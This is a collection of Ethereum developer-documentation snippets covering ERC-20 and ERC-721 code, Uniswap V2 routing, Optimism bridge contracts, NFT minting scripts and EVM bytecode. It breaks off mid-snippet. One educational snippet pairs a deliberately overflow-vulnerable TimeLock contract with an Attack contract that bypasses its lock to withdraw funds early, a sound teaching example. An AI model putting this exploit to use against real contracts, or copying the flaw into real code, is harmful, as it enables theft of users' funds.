\"608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382\"\n```\n\n----------------------------------------\n\nTITLE: Initializing web3.js with a remote node\nDESCRIPTION: Creating a new Web3 instance connected to a hosted Ethereum node service. This approach is useful when you don't want to run your own node infrastructure.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"https://cloudflare-eth.com\")\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-165 Interface Detection in Vyper\nDESCRIPTION: Defines storage and constants for ERC-165 interface detection. This allows other contracts to query which interfaces (like ERC-721) are supported by this contract, using interface IDs stored as bytes32 values.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev Mapping of interface id to bool about whether or not it's supported\nsupportedInterfaces: HashMap[bytes32, bool]\n\n# @dev ERC165 interface ID of ERC165\nERC165_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000001ffc9a7\n\n# @dev ERC165 interface ID of ERC721\nERC721_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000080ac58cd\n```\n\n----------------------------------------\n\nTITLE: Checking if Receiver Address is a Contract in ERC-721 safeTransferFrom\nDESCRIPTION: This code checks if the receiving address is a contract. If it's a user address, the transfer is considered safe. If it's a contract, additional verification is required.\n\nLANGUAGE: vyper\nCODE:\n```\n    if _to.is_contract: # check if `_to` is a contract address\n```\n\n----------------------------------------\n\nTITLE: Getting Total Supply of Shares in ERC-4626 Vault\nDESCRIPTION: This method returns the total number of outstanding unredeemed shares in the vault.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction totalSupply() public view returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: DELEGATECALL Operation in EVM (F4)\nDESCRIPTION: Calls another contract with the context of the current contract, preserving msg.sender and msg.value. Stores any return data in memory.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Creating and Uploading NFT Metadata to IPFS in JavaScript\nDESCRIPTION: Function implementation that creates an NFT metadata object and uploads it to IPFS via the pinJSONToIPFS function, handling success and error responses.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const mintNFT = async (url, name, description) => {\n  //error handling\n  if (url.trim() == \"\" || name.trim() == \"\" || description.trim() == \"\") {\n    return {\n      success: false,\n      status: \"❗Please make sure all fields are completed before minting.\",\n    }\n  }\n\n  //make metadata\n  const metadata = new Object()\n  metadata.name = name\n  metadata.image = url\n  metadata.description = description\n\n  //make pinata call\n  const pinataResponse = await pinJSONToIPFS(metadata)\n  if (!pinataResponse.success) {\n    return {\n      success: false,\n      status: \"😢 Something went wrong while uploading your tokenURI.\",\n    }\n  }\n  const tokenURI = pinataResponse.pinataUrl\n}\n```\n\n----------------------------------------\n\nTITLE: Minting Liquidity Tokens and Refunding Excess ETH in Solidity\nDESCRIPTION: Code that mints liquidity tokens to the recipient and refunds any excess ETH that wasn't needed for the optimal ratio.\n\nLANGUAGE: solidity\nCODE:\n```\n    liquidity = IUniswapV2Pair(pair).mint(to);\n    // refund dust eth, if any\n    if (msg.value > amountETH) TransferHelper.safeTransferETH(msg.sender, msg.value - amountETH);\n}\n```\n\n----------------------------------------\n\nTITLE: Defining mintNFT Function Signature for NFT Creation\nDESCRIPTION: Function signature for the mintNFT function which will handle the entire NFT minting process including uploading metadata to IPFS and interacting with the smart contract.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const mintNFT = async (url, name, description) => {}\n```\n\n----------------------------------------\n\nTITLE: PBKDF2-SHA-256 Test Vector for Web3 Secret Storage\nDESCRIPTION: A JSON example of a Web3 keystore file using AES-128-CTR cipher and PBKDF2-SHA-256 for key derivation. Includes complete structure with crypto parameters, ciphertext, and MAC for verification purposes.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"crypto\": {\n    \"cipher\": \"aes-128-ctr\",\n    \"cipherparams\": {\n      \"iv\": \"6087dab2f9fdbbfaddc31a909735c1e6\"\n    },\n    \"ciphertext\": \"5318b4d5bcd28de64ee5559e671353e16f075ecae9f99c7a79a38af5f869aa46\",\n    \"kdf\": \"pbkdf2\",\n    \"kdfparams\": {\n      \"c\": 262144,\n      \"dklen\": 32,\n      \"prf\": \"hmac-sha256\",\n      \"salt\": \"ae3cd4e7013836a3df6bd7241b12db061dbe2c6785853cce422d148a624ce0bd\"\n    },\n    \"mac\": \"517ead924a9d0dc3124507e3393d175ce3ff7c1e96529c6c555ce9e51205e9b2\"\n  },\n  \"id\": \"3198bc9c-6672-5ab3-d995-4942343ae5b6\",\n  \"version\": 3\n}\n```\n\n----------------------------------------\n\nTITLE: L2 Standard ERC-20 Implementation\nDESCRIPTION: Implementation of the IL2StandardERC20 interface that extends OpenZeppelin's ERC20. This contract ensures that only the L2 bridge can mint and burn tokens, maintaining the correct token supply balance between L1 and L2.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"./IL2StandardERC20.sol\";\n\ncontract L2StandardERC20 is IL2StandardERC20, ERC20 {\n    address public l1Token;\n    address public l2Bridge;\n\n    /**\n     * @param _l2Bridge Address of the L2 standard bridge.\n     * @param _l1Token Address of the corresponding L1 token.\n     * @param _name ERC20 name.\n     * @param _symbol ERC20 symbol.\n     */\n    constructor(\n        address _l2Bridge,\n        address _l1Token,\n        string memory _name,\n        string memory _symbol\n    ) ERC20(_name, _symbol) {\n        l1Token = _l1Token;\n        l2Bridge = _l2Bridge;\n    }\n\n    modifier onlyL2Bridge() {\n        require(msg.sender == l2Bridge, \"Only L2 Bridge can mint and burn\");\n        _;\n    }\n\n\n    // slither-disable-next-line external-function\n    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {\n        bytes4 firstSupportedInterface = bytes4(keccak256(\"supportsInterface(bytes4)\")); // ERC165\n        bytes4 secondSupportedInterface = IL2StandardERC20.l1Token.selector ^\n            IL2StandardERC20.mint.selector ^\n            IL2StandardERC20.burn.selector;\n        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;\n    }\n\n    // slither-disable-next-line external-function\n    function mint(address _to, uint256 _amount) public virtual onlyL2Bridge {\n        _mint(_to, _amount);\n\n        emit Mint(_to, _amount);\n    }\n\n    // slither-disable-next-line external-function\n    function burn(address _from, uint256 _amount) public virtual onlyL2Bridge {\n        _burn(_from, _amount);\n\n        emit Burn(_from, _amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: SPDX License Identifier Declaration for Optimism Bridge Contracts\nDESCRIPTION: Declares the MIT license for the Optimism bridge contracts. Most Optimism code is published under the MIT license.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\n```\n\n----------------------------------------\n\nTITLE: Declaring a Transfer Event in Solidity\nDESCRIPTION: A common ERC20 Transfer event declaration that logs the sender, recipient, and amount of tokens transferred. The event includes indexed parameters to make them searchable.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Transfer(address indexed from, address indexed to, uint256 value);\n```\n\n----------------------------------------\n\nTITLE: Handling Callback for Flash Swaps\nDESCRIPTION: Calls the recipient's uniswapV2Call function if data is provided, enabling flash swap functionality where the recipient can perform operations before providing payment.\n\nLANGUAGE: solidity\nCODE:\n```\nif (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Token System in Serpent\nDESCRIPTION: This code snippet demonstrates how to implement a simple token transfer system in Serpent language on Ethereum. It provides the fundamental logic for sending tokens from one address to another, checking for sufficient balance before transfer. This represents the core functionality needed for custom token implementations on Ethereum.\n\nLANGUAGE: python\nCODE:\n```\ndef send(to, value):\n  if self.storage[msg.sender] >= value:\n    self.storage[msg.sender] = self.storage[msg.sender] - value\n    self.storage[to] = self.storage[to] + value\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe Token Transfer in Uniswap\nDESCRIPTION: Internal function that safely transfers ERC-20 tokens from the pair to another address. Handles both revert and false return types from token contracts.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _safeTransfer(address token, address to, uint value) private {\n    (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));\n    require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');\n}\n```\n\n----------------------------------------\n\nTITLE: Game System Contract New Game Function\nDESCRIPTION: The onchain newGame function in GameSystem adds the request to the PendingGame table if the player doesn't have an active game.\n\nLANGUAGE: Solidity\nCODE:\n```\n// From GameSystem.sol lines 16-22\nfunction newGame() public {\n  // Check that the caller doesn't have a game in progress\n  require(PlayerGame.get(_msgSender()).gameId == 0, \"Game in progress\");\n  \n  // Request a new game from the server\n  PendingGame.set(_msgSender(), true);\n}\n```\n\n----------------------------------------\n\nTITLE: Writing a Deployment Script for the Smart Contract\nDESCRIPTION: A JavaScript deployment script that uses Ethers.js to deploy the HelloWorld contract to the Ethereum network. It initializes the contract with a \"Hello World!\" message and logs the deployed contract address.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n   const HelloWorld = await ethers.getContractFactory(\"HelloWorld\");\n\n   // Start deployment, returning a promise that resolves to a contract object\n   const hello_world = await HelloWorld.deploy(\"Hello World!\");\n   console.log(\"Contract deployed to address:\", hello_world.address);}\n\nmain()\n  .then(() => process.exit(0))\n  .catch(error => {\n    console.error(error);\n    process.exit(1);\n  });\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 TotalSupply Function in Solidity\nDESCRIPTION: This function implements the IERC20 interface's totalSupply method, returning the total amount of tokens in circulation. It's a view function that doesn't modify state and returns a uint256 value.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n```\n\n----------------------------------------\n\nTITLE: Defining Trade Structure for ERC-721 Marketplace in Solidity\nDESCRIPTION: Definition of a Trade struct representing an advert in the classifieds board. Each trade includes the poster's address, the tokenized item ID, the price, and the status of the trade.\n\nLANGUAGE: solidity\nCODE:\n```\nstruct Trade {\n  address poster;\n  uint256 item;\n  uint256 price;\n  bytes32 status; // Open, Executed, Cancelled\n}\n```\n\n----------------------------------------\n\nTITLE: Sending Cross-Domain Message for L1-L2 ERC20 Bridge Deposit\nDESCRIPTION: This code constructs and sends a cross-domain message to the L2 token bridge to finalize the deposit on L2. It also updates the deposits tracking structure with the deposited amount and emits an event to record the deposit.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Construct calldata for _l2Token.finalizeDeposit(_to, _amount)\n        bytes memory message = abi.encodeWithSelector(\n            IL2ERC20Bridge.finalizeDeposit.selector,\n            _l1Token,\n            _l2Token,\n            _from,\n            _to,\n            _amount,\n            _data\n        );\n\n        // Send calldata into L2\n        // slither-disable-next-line reentrancy-events, reentrancy-benign\n        sendCrossDomainMessage(l2TokenBridge, _l2Gas, message);\n\n        // slither-disable-next-line reentrancy-benign\n        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;\n\n        // slither-disable-next-line reentrancy-events\n        emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: Defining State Transition Function in Formal Notation\nDESCRIPTION: A formal mathematical notation showing how a state transition function works in blockchain systems, taking a state and transaction as input and producing either a new state or an error.\n\nLANGUAGE: plaintext\nCODE:\n```\nAPPLY(S,TX) -> S' atau ERROR\n```\n\n----------------------------------------\n\nTITLE: Integer Overflow Attack Example in Solidity\nDESCRIPTION: This code demonstrates an integer overflow vulnerability in a time-locked wallet contract and an attack contract that exploits it. The attack manipulates the lockTime variable to overflow, bypassing the time lock restriction.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.7.6;\n\n// This contract is designed to act as a time vault.\n// User can deposit into this contract but cannot withdraw for at least a week.\n// User can also extend the wait time beyond the 1 week waiting period.\n\n/*\n1. Deploy TimeLock\n2. Deploy Attack with address of TimeLock\n3. Call Attack.attack sending 1 ether. You will immediately be able to\n   withdraw your ether.\n\nWhat happened?\nAttack caused the TimeLock.lockTime to overflow and was able to withdraw\nbefore the 1 week waiting period.\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease;\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(block.timestamp > lockTime[msg.sender], \"Lock time not expired\");\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    TimeLock timeLock;\n\n    constructor(TimeLock _timeLock) {\n        timeLock = TimeLock(_timeLock);\n    }\n\n    fallback() external payable {}\n\n    function attack() public payable {\n        timeLock.deposit{value: msg.value}();\n        /*\n        if t = current lock time then we need to find x such that\n        x + t = 2**256 = 0\n        so x = -t\n        2**256 = type(uint).max + 1\n        so x = type(uint).max + 1 - t\n        */\n        timeLock.increaseLockTime(\n            type(uint).max + 1 - timeLock.lockTime(address(this))\n        );\n        timeLock.withdraw();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Detecting Contract Addresses Using Assembly in Solidity\nDESCRIPTION: Internal function that determines if an address is a contract by checking its code size using inline assembly. Includes comments about the limitations of this approach and future compatibility concerns with Ethereum Serenity.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction isContract(address account) internal view returns (bool) {\n        uint256 size;\n        // Currently there is no better way to check if there is a contract in an address\n        // than to check the size of the code at that address.\n        // En https://ethereum.stackexchange.com/a/14016/36603\n        // podrás consultar más detalles sobre cómo funciona esto.\n        // TODO Verifica esto de nuevo antes de el lanzamiento de Serenity, porque todas las direcciones serán\n        // contratos entonces.\n        // solium-disable-next-line security/no-inline-assembly\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n```\n\n----------------------------------------\n\nTITLE: Importing Pinata API Credentials from Environment Variables\nDESCRIPTION: Code to import Pinata API credentials from the .env file using the dotenv package for secure access in the application.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Scripts in package.json\nDESCRIPTION: Updated package.json with both build and test scripts for compiling and testing smart contracts with Waffle.\n\nLANGUAGE: json\nCODE:\n```\n\"scripts\": {\n    \"build\": \"waffle\",\n    \"test\": \"export NODE_ENV=test && mocha -r ts-node/register 'test/**/*.test.ts'\"\n  }\n```\n\n----------------------------------------\n\nTITLE: Previewing Deposit Result in ERC-4626 Vault\nDESCRIPTION: This method simulates the effect of a deposit operation in the current block, allowing users to preview how many shares they would receive for depositing a specified amount of assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction previewDeposit(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Importing Foundry Test Dependencies in Solidity\nDESCRIPTION: Basic imports needed for Foundry testing, including the Test contract and console logging functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\n\n// Need to run `forge test -vv` for the console.\nimport \"forge-std/console.sol\";\n```\n\n----------------------------------------\n\nTITLE: Updating State in Ethereum Smart Contract\nDESCRIPTION: JavaScript code that updates the 'message' stored in the smart contract by calling the contract's update function. It waits for the transaction to be mined before proceeding to ensure the state change is complete.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// ...\n\nasync function main() {\n  const message = await helloWorldContract.message()\n  console.log(\"The message is: \" + message)\n\n  console.log(\"Updating the message...\")\n  const tx = await helloWorldContract.update(\"This is the new message.\")\n  await tx.wait()\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Checking Token Existence in Solidity\nDESCRIPTION: Internal view function that verifies if a token exists by checking if its owner address is not the zero address, indicating the token has been minted.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n        address owner = pizzaToOwner[pizzaId];\n        return owner != address(0);\n    }\n```\n\n----------------------------------------\n\nTITLE: Updating Price Accumulators on First Block Transaction in Uniswap V2 (Solidity)\nDESCRIPTION: This code checks if this is the first exchange transaction in the current block. If so and if both reserves are non-zero, it will update the price accumulators which are used for time-weighted average price (TWAP) calculations.\n\nLANGUAGE: solidity\nCODE:\n```\n        uint32 blockTimestamp = uint32(block.timestamp % 2**32);\n        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired\n        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {\n```\n\n----------------------------------------\n\nTITLE: Deploying NFT Contract with Hardhat on Sepolia Network\nDESCRIPTION: Command to deploy the NFT smart contract to the Sepolia testnet using Hardhat. This executes the deployment script that was previously created in the project.\n\nLANGUAGE: shell\nCODE:\n```\nnpx hardhat --network sepolia run scripts/deploy.js\n```\n\n----------------------------------------\n\nTITLE: Cross-Domain Message Sending Function Signature in Solidity\nDESCRIPTION: Defines the function signature for sending messages to the other domain. This function takes the target address, gas limit, and message data as parameters for cross-layer communication.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * Sends a message to an account on another domain\n     * @param _crossDomainTarget The intended recipient on the destination domain\n     * @param _message The data to send to the target (usually calldata to a function with\n     *  `onlyFromCrossDomainAccount()`)\n     * @param _gasLimit The gasLimit for the receipt of the message on the target domain.\n     */\n    function sendCrossDomainMessage(\n        address _crossDomainTarget,\n        uint32 _gasLimit,\n        bytes memory _message\n```\n\n----------------------------------------\n\nTITLE: Token Validation and Minting in Optimism L2 Bridge\nDESCRIPTION: Validates that the L2 token implements the correct interface and that its L1 token matches the source token. If valid, it mints the tokens to the recipient's address and emits a DepositFinalized event.\n\nLANGUAGE: solidity\nCODE:\n```\n        // Check the target token is compliant and\n        // verify the deposited token on L1 matches the L2 deposited token representation here\n        if (\n            // slither-disable-next-line reentrancy-events\n            ERC165Checker.supportsInterface(_l2Token, 0x1d1d8b63) &&\n            _l1Token == IL2StandardERC20(_l2Token).l1Token()\n        ) {\n            // When a deposit is finalized, we credit the account on L2 with the same amount of\n            // tokens.\n            // slither-disable-next-line reentrancy-events\n            IL2StandardERC20(_l2Token).mint(_to, _amount);\n            // slither-disable-next-line reentrancy-events\n            emit DepositFinalized(_l1Token, _l2Token, _from, _to, _amount, _data);\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract OPCODES Fragment\nDESCRIPTION: Partial opcodes representation of the ERC20 token contract implementation, showing constructor logic and initial setup of token properties including name, symbol, and decimals.\n\nLANGUAGE: opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0x1539 CODESIZE SUB DUP1 PUSH3 0x1539 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x5 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4261736963000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x4253430000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP2 PUSH1 0x3 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xCC SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP DUP1 PUSH1 0x4 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0xE5 SWAP3 SWAP2 SWAP1 PUSH3 0x389 JUMP JUMPDEST POP PUSH1 0x12 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH3 0x116 CALLER DUP3 PUSH3 0x11D PUSH1 0x20 SHL PUSH1 0x20 SHR JUMP JUMPDEST POP PUSH3 0x438 JUMP\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Token Cleanup Function in Solidity\nDESCRIPTION: A function that allows the contract owner to recover ERC-20 tokens that were mistakenly sent to the contract. It creates an interface to the token contract at the specified address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction cleanupERC20(\n    address erc20,\n    address dest\n)\n    public\n    onlyOwner\n{\n    IERC20 token = IERC20(erc20);\n```\n\n----------------------------------------\n\nTITLE: Swap ETH For Exact Tokens in Solidity\nDESCRIPTION: This function allows users to receive an exact amount of tokens by spending ETH. It validates the path starts with WETH, calculates required input amounts, wraps ETH as WETH, executes the swap, and refunds any excess ETH to the sender.\n\nLANGUAGE: solidity\nCODE:\n```\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    {\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] <= msg.value, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        IWETH(WETH).deposit{value: amounts[0]}();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n        // refund dust eth, if any\n        if (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);\n    }\n```\n\n----------------------------------------\n\nTITLE: Converting Assets to Shares in ERC-4626 Vault\nDESCRIPTION: The convertToShares function calculates how many vault shares would be received in exchange for a specified amount of underlying assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction convertToShares(uint256 assets) public view returns (uint256 shares)\n```\n\n----------------------------------------\n\nTITLE: Implementing _transfer Function in Solidity for ERC-20 Tokens\nDESCRIPTION: This internal function moves tokens from one address to another. It includes safety checks against zero addresses, emits a Transfer event, and provides a hook for derived contracts. It ensures atomic transfers by updating balances sequentially with no intervening operations.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Moves tokens `amount` from `sender` to `recipient`.\n *\n * This is internal function is equivalent to {transfer}, and can be used to\n * e.g. implement automatic token fees, slashing mechanisms, etc.\n *\n * Emits a {Transfer} event.\n *\n * Requirements:\n *\n * - `sender` cannot be the zero address.\n * - `recipient` cannot be the zero address.\n * - `sender` must have a balance of at least `amount`.\n */\nfunction _transfer(address sender, address recipient, uint256 amount) internal virtual {\n    require(sender != address(0), \"ERC20: transfer from the zero address\");\n    require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n    _beforeTokenTransfer(sender, recipient, amount);\n\n    _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\n    _balances[recipient] = _balances[recipient].add(amount);\n    emit Transfer(sender, recipient, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Utilizzo di errori personalizzati in Solidity 0.8.4+\nDESCRIPTION: Implementazione di errori personalizzati introdotti in Solidity 0.8.4 per ridurre le dimensioni del contratto. Gli errori personalizzati vengono codificati come selettori in ABI, occupando meno spazio rispetto alle stringhe di errore.\n\nLANGUAGE: solidity\nCODE:\n```\nerror Unauthorized();\n\nif (msg.sender != owner) {\n    revert Unauthorized();\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Token System in Serpent for Ethereum\nDESCRIPTION: A simple implementation of a token transfer function in Serpent that allows users to send tokens to others if they have sufficient balance. This represents the core logic of a basic cryptocurrency or token system on Ethereum.\n\nLANGUAGE: Serpent\nCODE:\n```\ndef send(to, value):\n  if self.storage[msg.sender] >= value:\n    self.storage[msg.sender] = self.storage[msg.sender] - value\n    self.storage[to] = self.storage[to] + value\n```\n\n----------------------------------------\n\nTITLE: Transferring ERC20 Tokens in L1-L2 Bridge Deposit\nDESCRIPTION: This snippet handles the token transfer from the sender to the bridge contract during an ERC-20 deposit operation. It uses safeTransferFrom to ensure the tokens are properly transferred to the bridge for future withdrawals.\n\nLANGUAGE: solidity\nCODE:\n```\n        // When a deposit is initiated on L1, the L1 Bridge transfers the funds to itself for future\n        // withdrawals. safeTransferFrom also checks if the contract has code, so this will fail if\n        // _from is an EOA or address(0).\n        // 